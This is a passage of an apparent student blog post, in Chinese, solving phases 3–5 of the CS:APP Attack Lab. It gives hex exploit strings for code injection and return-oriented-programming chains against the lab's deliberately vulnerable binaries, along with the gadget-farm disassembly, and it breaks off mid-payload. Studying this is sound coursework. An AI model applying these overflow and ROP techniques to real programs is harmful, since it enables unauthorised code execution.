representations:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">     <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">     <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">     <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     vlevel = <span class="number">3</span>;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Part of validation protocol */</span></span><br><span class="line">     <span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:</span></span><br><span class="line"><span class="string">         You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">         validate(<span class="number">3</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Misfire:</span></span><br><span class="line"><span class="string">         You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">         fail(<span class="number">3</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p><p>这个题目的几个关键点:</p><ol><li>cooike的 string ascii码表示</li><li>cooike的string ascii码的存放以及 <strong>存放位置的确定</strong></li><li>rdi指向 string 的存放地址.</li><li>touch3跳转</li></ol><p>cooike的ascii码很简单, 对照ascii码表即可得:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 9 bytes *&#x2F; </span><br></pre></td></tr></table></figure><p>唯一值得注意的是, 要在末尾添加\0表示c 字符串的结束.</p><p>难点在于确定位置: 说说我做的时候遇到的问题:</p><p>之所以难以确定字符串存放的位置, 是因为后续的hexmatch和stringncmp函数会覆盖buf的stack空间.</p><ul><li><p>我最初想的是, 将字符串存放在一个相对很低的位置, 让后续的两个函数不会产生覆盖. 但是这样的问题是, cooike string无法进行硬编码. 毕竟没有指令可以直接写字符串到内存中, 倒是可以一个个字符的写入, 但是这样我们的exploit string会过长, 于是这个方法废弃了.</p></li><li><p>说第二想法之前, 我们先看看后续的程序会对stack空间做些什么:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090502836.png" alt="image-20200721090502836"></p><p>那字符串到底放在哪里? 我尝试了将字符串放在了buf的stack顶端和低端, 如下两图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090628772.png" alt="image-20200721090628772"></p><p>经过gdb调试,两者都会被覆盖, 所以这个方案也被pass掉了.</p><p>继续思考, 放在内存的低端的确很容易被覆盖,因为hexmatch函数中有个随机从某个位置开始写入cbuf的操作, 所以低端是没法用的. 只能考虑高端, 高端是由 push压入regs导致的覆盖, 只要避免了这个就好了. 回忆以下push指令是如何工作的, </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push reg</span><br></pre></td></tr></table></figure><p>reg被压入%rsp当前指向的内存空间, 然后%rsp-1</p><p>所以我们可以直接继续覆盖, 看示意图:</p></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p><p>可以得到注入代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question3: *&#x2F;</span><br><span class="line">48 c7 c7 a8 dc 61 55 &#x2F;* mov $0x5561dca8,%rdi 设置$rdi指向string内存地址 *&#x2F;</span><br><span class="line">68 fa 18 40 00       &#x2F;* pushq  $0x4018fa     push touch3的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 继续覆盖为cookie string *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-Phase-4"><a href="#4-Phase-4" class="headerlink" title="4. Phase 4"></a>4. Phase 4</h2><p>从这个阶段开始, 就是aop攻击的内容了. 所以在继续之前, 一定要知道rop攻击的理论基础. </p><p>rop的背景是 在stack随机和注入不可能执行 等防止注入攻击手段下, 我们可以寻找text section中有效的代码片段, 这些片段通常都是以ret结尾, 找到这些指令后(一个这样的片段被称为一个gaddget), 通过stack frame入栈出栈原理,将这些gaddget串成一条链, 从而能够组成有用的攻击代码.</p><p>本题的背景是开启了 stack随机化和注入注入代码不可执行 两个功能的.</p><p>好,现在来看看phase4题目:</p><p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).<br>movq : The codes for these are shown in Figure 3A.<br>popq : The codes for these are shown in Figure 3B.<br>ret : This instruction is encoded by the single byte 0xc3.<br>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single<br>byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093742135.png" alt="image-20200721093742135"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093753166.png" alt="image-20200721093753166"></p><p>所有可用指令, 我都高亮了.</p><p>注意点:</p><p>题目中提到的gadget farm是指在rtaget反汇编后, 我们的gaddget只能从start_farm段到end_farm段之间的所有指令中抽取. 这之间的指令为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401999:c3                   retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:b8 fb 78 90 90       mov    $0x909078fb,%eax</span><br><span class="line">  40199f:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4019d5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:c7 07 99 d1 90 90    movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:8d 87 8d d1 20 db    lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:b8 89 d1 48 c0       mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:c7 07 81 d1 84 c0    movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:c7 07 88 c2 08 c9    movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:b8 48 89 e0 c1       mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:8d 87 89 c2 00 c9    lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:c7 07 81 ce 08 db    movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:8d 87 c8 89 e0 c3    lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:8d 87 48 89 e0 c7    lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:b8 99 d1 08 d2       mov    $0xd208d199,%eax</span><br><span class="line">  401a53:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:b8 89 c2 c4 c9       mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:c7 07 48 89 e0 91    movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:8d 87 89 ce 92 c3    lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:c7 07 89 d1 91 c3    movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:c7 07 81 c2 38 d2    movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:c7 07 09 ce 08 c9    movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:8d 87 08 89 e0 90    lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:8d 87 89 c2 c7 3c    lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:b8 88 ce 20 c0       mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:c7 07 48 89 e0 c2    movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:8d 87 89 c2 60 d2    lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:b8 8d ce 20 d2       mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401ab7:c3                   retq   </span><br><span class="line">  401ab8:90                   nop</span><br><span class="line">  401ab9:90                   nop</span><br><span class="line">  401aba:90                   nop</span><br><span class="line">  401abb:90                   nop</span><br><span class="line">  401abc:90                   nop</span><br><span class="line">  401abd:90                   nop</span><br><span class="line">  401abe:90                   nop</span><br><span class="line">  401abf:90                   nop</span><br></pre></td></tr></table></figure><ol start="2"><li>rdi要如何设置为cookie</li><li>如何跳转到touch2</li></ol><p>我将所有可以用的指令都高亮了出来, 根据提示, 我们只需要只用Figure A和Figure B中的指令即可. 这里能够修改的rdi的只有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $rax, $rdi</span><br></pre></td></tr></table></figure><p>那问题转到$rax了,再看能修改$rax的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $rsp, $rax </span><br><span class="line">pop $rax</span><br></pre></td></tr></table></figure><p>显然,用pop的概率更大.</p><p>pop是将$rsp当前指向的数据  pop 到 $rax 上, 所以我们可得gaddget如下图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093518556.png" alt="image-20200721093518556"></p><p>知道这些, 我们只用到 rtaget的gaddgets_farm中找到对应的指令字节码即可, 最终可得:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 先填充40个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">&#x2F;* 写入gadgets *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">fa 97 b9 59 00 00 00 00 &#x2F;* cookie *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ec 17 40 00 00 00 00 00 &#x2F;* touch2 地址 *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="5-Phase-5"><a href="#5-Phase-5" class="headerlink" title="5. Phase 5"></a>5. Phase 5</h2><p>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string epresentation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p><p>To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.</p><p>这个题目的确是个比较坑的题目, 因为从前文做到现在, 很容易让人联想到, 我所有需要的gaddgets都是依据表格中给出的指令, 然后到farm对比中得到的.  如果你是这样想的, 那肯定是做不出来的了. 因为你会发现, 不论怎么做, 你都无法使rdi指向 cookie的string数据内存地址. </p><p>本题的关键是如下这段代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br></pre></td></tr></table></figure><p>lea指令, 实现了相加功能, 一旦能实现相加功能, 我们就能使 rdi = cookie 的string内存地址了. 至于为什么, 我们一步步分析.</p><p>本题起始就是phase3的rop版. 回忆下phase3中我们要做的工作的几个关键点:</p><ol><li>cooike的 string ascii码表示</li><li>cooike的string ascii码的存放以及 <strong>存放位置的确定</strong></li><li>rdi指向 string 的存放地址.</li><li>touch3跳转</li></ol><p>回忆以下我们在phase3中是怎么做的?看看下面的示意图.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p><p>从这张图中, 我们可以考虑一下如果运用aop , string到底放在哪里合适? 我们的前提是任何时候都不能覆盖string.</p><p><strong>显然 string 依然应该放内存中的最高位. 因为栈是往下push的.</strong> </p><p>好, 那什么时候跳转到touch3? </p><p>当然是我们确定rdi已经指向了string 内存地址之后.</p><p>所以touch3 应该在 rdi赋值 指令之后.</p><p>现在唯一的问题就剩下, rdi如何赋值?</p><p>这时候就需要逆向思维了, 查看表格, 能够修改rdi的有哪些?</p><p>仅有两条:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $rax, $rdi</span><br><span class="line">movl $eax, $edi</span><br></pre></td></tr></table></figure><p>要知道, mov是将一个寄存器的值直接赋值给另一个寄存器的, 而在本次实验中, stack是随机化的, 我们不可能固定 string 字符串的内存位置, <strong>所以可以使用相对偏移量来做</strong>, 我们能确定的是getbuf函数返回后, $rsp的位置. 那么有:<br>$$<br>cookie_value_address = $rsp + offset<br>$$<br>应该注意到, $rdi一定会在最后被赋值一次, 因为rdi才是函数调用的第一个参数. 那如果去构造上面这个公式呢? 这就又需要逆向思维了?</p><p>谁能修改 rdi? –&gt; rax可以.</p><p>谁能修该 rax? –&gt; rsp 和 pop指令</p><p>rax可以修改谁? –&gt; 可以修改rdi, edx</p><p>edx可以修改谁? –&gt;  可以修改ecx</p><p>ecx可以修改谁? –&gt; 可以修改esi</p><p>再结合前文的lea指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea    (%rdi,%rsi,1),%rax</span><br></pre></td></tr></table></figure><p>rax = rdi + rsi</p><p>这样, 所有的条件都凑齐了.</p><p>画个示意图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png" alt="image-20200721100554201"></p><p>于是可以有攻击代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 前0x28个字符填充0x00 *&#x2F;</span><br><span class="line">06 1a 40 00 00 00 00 00 &#x2F;* mov $rsp,$rax *&#x2F;</span><br><span class="line">c5 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* offset *&#x2F;</span><br><span class="line">dd 19 40 00 00 00 00 00 &#x2F;* movl $eax,$edx *&#x2F;</span><br><span class="line">34 1a 40 00 00 00 00 00 &#x2F;* movl $edx,$ecx *&#x2F;</span><br><span class="line">63 1a 40 00 00 00 00 00 &#x2F;* movl $ecx,$esi *&#x2F;</span><br><span class="line">d6 19 40 00 00 00 00 00 &#x2F;* 